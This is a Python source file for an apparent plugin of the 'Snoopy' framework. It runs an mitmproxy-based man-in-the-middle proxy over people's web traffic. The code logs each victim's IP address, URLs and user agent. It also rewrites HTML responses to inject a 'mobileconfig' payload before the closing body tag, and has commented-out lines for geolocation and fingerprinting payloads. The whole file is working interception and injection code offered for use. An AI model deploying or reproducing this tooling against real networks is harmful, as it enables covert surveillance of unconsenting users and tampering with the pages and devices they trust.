#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import logging
import datetime

from libmproxy import flow, protocol
from collections import deque
from urlparse import urlparse

from plugins.modshttp.apps import proxyapp
from plugins.modshttp.payloads import geolocation, fingerprint, mobileconfig

class SnoopyMaster(flow.FlowMaster):
    def __init__(self, **kwargs):
        flow.FlowMaster.__init__(self, kwargs.get("server"), kwargs.get("state"))

        self.dbms = kwargs.get("dbms")
        self.run_id = kwargs.get("run_id")
        self.logs = deque()
        self.locations = deque()
        self.fingerprints = deque()

        proxyapp.config.update(DATA_LOCATIONS=self.locations,
            DATA_FINGERPRINTS=self.fingerprints,
            PLUGIN_NAME=kwargs.get("plugin_name"))

        self.apps.add(proxyapp, "proxyapp", 80)

    def run(self):
        self.proc = SnoopyFlowProcessor()
        try:
            flow.FlowMaster.run(self)
        except KeyboardInterrupt:
            self.shutdown()

    def handle_request(self, r):
        r = self.proc.process_request(self, r)
        f = flow.FlowMaster.handle_request(self, r)
        if f:
            r.reply()
        return f

    def handle_response(self, r):
        f = flow.FlowMaster.handle_response(self, r)
        if f:
            r = self.proc.process_response(self, r)
            r.reply()
        return f

class SnoopyFlowProcessor():
    def init(self):
        pass

    def process_request(self, master, r):
        r.anticache()

        url = r.get_url(hostheader=True)
        if url is None:
            return r

        useragent = r.headers.get('User-agent')
        if useragent:
            useragent = useragent[0]
        else:
            useragent = None

        master.logs.append({
            'client_ip' : r.flow.client_conn.address.host,
            'timestamp' : datetime.datetime.fromtimestamp(r.timestamp_start),
            'protocol'  : r.get_scheme(),
            'method'    : r.method,
            'host'      : r.get_host(hostheader=True),
            'url'       : url,
            'useragent' : useragent
        })

        return r

    def process_response(self, master, r):
        content_type = r.headers.get('Content-Type')
        if not content_type or not 'text/html' in content_type[0]:
            return r

        # r.replace("</body>", geolocation + "</body>")
        # r.replace("</body>", fingerprint + "</body>")
        r.replace("</body>", mobileconfig + "</body>")

        return r
